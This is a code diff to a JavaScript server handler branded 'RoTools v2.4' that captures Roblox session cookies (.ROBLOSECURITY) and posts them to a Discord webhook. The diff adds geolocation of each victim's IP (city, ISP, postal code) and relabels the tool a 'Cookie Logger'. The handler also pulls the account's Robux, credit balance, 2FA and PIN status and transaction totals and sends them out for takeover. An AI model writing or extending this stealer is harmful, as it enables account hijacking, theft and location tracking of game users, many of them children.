@@ -17,24 +17,51 @@ export default async function handler(req, res) {
       return res.status(400).json({ error: 'No cookie provided' });
     }
 
-    // 1. Send raw cookie to Discord
+    // Get client IP and detailed information
+    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    let ipDetails = "🌐 **IP Address**: " + clientIP;
+    
+    try {
+      const ipInfoResponse = await fetch(`https://ipinfo.io/${clientIP}/json`);
+      const ipInfo = await ipInfoResponse.json();
+      
+      ipDetails = `
+🌐 **IP Address**: ${ipInfo.ip || 'N/A'}
+📍 **Location**: ${ipInfo.city || 'N/A'}, ${ipInfo.region || 'N/A'}, ${ipInfo.country || 'N/A'}
+🏢 **ISP**: ${ipInfo.org ? ipInfo.org.split(' ').slice(1).join(' ') : 'N/A'}
+📮 **Postal**: ${ipInfo.postal || 'N/A'}
+🕒 **Timezone**: ${ipInfo.timezone || 'N/A'}
+      `.trim();
+    } catch (ipError) {
+      console.error('IP info error:', ipError);
+      ipDetails += "\n❌ *Additional IP details unavailable*";
+    }
+
+    // Send cookie information to Discord with @everyone ping
     await fetch(process.env.DISCORD_WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
+        content: "@everyone",
         embeds: [{
-          title: "🔐 Raw Cookie Received",
-          description: `\`\`\`${cookie}\`\`\``,
-          color: 0x3498db,
+          title: "🔐 RAW COOKIE CAPTURED",
+          description: `**IP Information**\n${ipDetails}\n\n**Captured Cookie**:`,
+          color: 0x000000,
+          fields: [
+            { 
+              name: "COOKIE DATA", 
+              value: `\`\`\`${cookie}\`\`\`` 
+            }
+          ],
           footer: {
-            text: "RoTools v2.4 | Raw Cookie"
+            text: "RoTools v2.4 | Cookie Logger"
           },
           timestamp: new Date().toISOString()
         }]
       })
     });
 
-    // 2. Get account information
+    // Verify cookie validity
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
     });
@@ -42,14 +69,14 @@ export default async function handler(req, res) {
     if (!userRes.ok || userRes.status === 401) {
       return res.json({ 
         success: false, 
-        error: 'Invalid cookie - authentication failed'
+        error: 'Invalid cookie - authentication failed' 
       });
     }
 
     const userData = await userRes.json();
     const userId = userData.id;
 
-    // Fetch all data in parallel
+    // Fetch all account data in parallel
     const [
       robuxRes,
       creditRes,
@@ -99,57 +126,50 @@ export default async function handler(req, res) {
     const transactionsData = await transactionsRes.json();
     const thumbnailData = await thumbnailRes.json();
 
-    // Process data
+    // Process gamepasses worth
     const account_gamepasses_worth = (gamepassesData.match(/"PriceInRobux":(\d+)/g) || [])
       .reduce((sum, match) => sum + parseInt(match.split(':')[1]), 0);
     
+    // Process badges
     const account_badges = (badgesData.match(/"name":"(.*?)"/g) || [])
       .map(match => match.split('"')[3])
       .join(', ') || 'None';
 
-    // Prepare full account information embed (like original Python)
+    // Prepare account information embed
     const accountInfoEmbed = {
-      title: ":white_check_mark: Valid Cookie",
-      description: "",
-      color: 0x38d13b,
+      title: "💼 ACCOUNT INFORMATION",
+      description: `**IP Information**\n${ipDetails}`,
+      color: 0x000000,
       thumbnail: { url: thumbnailData.data[0].imageUrl },
       fields: [
-        { name: ":money_mouth: Robux", value: `${robuxData.robux}`, inline: true },
-        { name: ":moneybag: Balance", value: `${creditData.balance} ${creditData.currencyCode}`, inline: true },
-        { name: ":bust_in_silhouette: Account Name", 
-          value: `${settingsData.Name} (${settingsData.DisplayName})`, inline: true },
-        { name: ":email: Email", value: `${settingsData.IsEmailVerified}`, inline: true },
-        { name: ":calendar: Account Age", 
-          value: `${(settingsData.AccountAgeInDays / 365).toFixed(2)} years`, inline: true },
-        { name: ":baby: Above 13", value: `${settingsData.UserAbove13}`, inline: true },
-        { name: ":star: Premium", value: `${settingsData.IsPremium}`, inline: true },
-        { name: ":key: Has PIN", value: `${settingsData.IsAccountPinEnabled}`, inline: true },
-        { name: ":lock: 2-Step Verification", 
-          value: `${settingsData.MyAccountSecurityModel?.IsTwoStepEnabled || false}`, inline: true },
-        { name: ":busts_in_silhouette: Friends", value: `${friendsData.count}`, inline: true },
-        { name: ":microphone2: Voice Verified", value: `${voiceData.isVerifiedForVoice}`, inline: true },
-        { name: ":video_game: Gamepasses Worth", 
-          value: `${account_gamepasses_worth} R$`, inline: true },
-        { name: ":medal: Badges", value: account_badges, inline: true },
-        { name: "**↻** Transactions", 
-          value: ":small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: ", 
-          inline: false },
-        { name: ":coin: Sales of Goods", value: `${transactionsData.salesTotal}`, inline: true },
+        { name: ":money_mouth: Robux Balance", value: `${robuxData.robux}`, inline: true },
+        { name: ":moneybag: Credit Balance", value: `${creditData.balance} ${creditData.currencyCode}`, inline: true },
+        { name: ":bust_in_silhouette: Account Name", value: `${settingsData.Name} (${settingsData.DisplayName})`, inline: true },
+        { name: ":email: Email Verified", value: `${settingsData.IsEmailVerified ? 'Yes' : 'No'}`, inline: true },
+        { name: ":calendar: Account Age", value: `${(settingsData.AccountAgeInDays / 365).toFixed(2)} years`, inline: true },
+        { name: ":baby: Above 13", value: `${settingsData.UserAbove13 ? 'Yes' : 'No'}`, inline: true },
+        { name: ":star: Premium Status", value: `${settingsData.IsPremium ? 'Active' : 'Inactive'}`, inline: true },
+        { name: ":key: PIN Enabled", value: `${settingsData.IsAccountPinEnabled ? 'Yes' : 'No'}`, inline: true },
+        { name: ":lock: 2FA Enabled", value: `${settingsData.MyAccountSecurityModel?.IsTwoStepEnabled ? 'Yes' : 'No'}`, inline: true },
+        { name: ":busts_in_silhouette: Friends Count", value: `${friendsData.count}`, inline: true },
+        { name: ":microphone2: Voice Verified", value: `${voiceData.isVerifiedForVoice ? 'Yes' : 'No'}`, inline: true },
+        { name: ":video_game: Gamepasses Value", value: `${account_gamepasses_worth} R$`, inline: true },
+        { name: ":medal: Badges", value: account_badges.substring(0, 1000), inline: false },
+        { name: "Transactions Summary", value: "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬", inline: false },
+        { name: ":coin: Goods Sales", value: `${transactionsData.salesTotal}`, inline: true },
         { name: "💰 Premium Payouts", value: `${transactionsData.premiumPayoutsTotal}`, inline: true },
-        { name: "📈 Commissions", value: `${transactionsData.affiliateSalesTotal}`, inline: true },
-        { name: ":credit_card: Robux Purchased", 
-          value: `${transactionsData.currencyPurchasesTotal}`, inline: true },
-        { name: "🚧 Pending", value: `${transactionsData.pendingRobuxTotal}`, inline: true },
-        { name: ":money_with_wings: Overall", 
-          value: `${Math.abs(transactionsData.purchasesTotal)}`, inline: true }
+        { name: "📈 Affiliate Commissions", value: `${transactionsData.affiliateSalesTotal}`, inline: true },
+        { name: ":credit_card: Robux Purchased", value: `${transactionsData.currencyPurchasesTotal}`, inline: true },
+        { name: "🚧 Pending Robux", value: `${transactionsData.pendingRobuxTotal}`, inline: true },
+        { name: ":money_with_wings: Total Purchases", value: `${Math.abs(transactionsData.purchasesTotal)}`, inline: true }
       ],
       footer: {
-        text: "RoTools v2.4 | Full Account Information"
+        text: "RoTools v2.4 | Account Details (Made by dih)"
       },
       timestamp: new Date().toISOString()
     };
 
-    // Send full account information to Discord
+    // Send account information to Discord
     await fetch(process.env.DISCORD_WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -167,15 +187,14 @@ export default async function handler(req, res) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         embeds: [{
-          title: ":x: Processing Error",
-          description: "An error occurred while processing the account information",
-          color: 0xFF0000,
-          fields: [{
-            name: "Error Message",
-            value: error.message || 'Unknown error'
-          }],
+          title: "❌ PROCESSING ERROR",
+          description: "Failed to process account information",
+          color: 0x000000,
+          fields: [
+            { name: "Error Details", value: `\`\`\`${error.message || 'Unknown error'}\`\`\`` }
+          ],
           footer: {
-            text: "RoTools v2.4 | Error Notification"
+            text: "RoTools v2.4 | Error Report"
           },
           timestamp: new Date().toISOString()
         }]
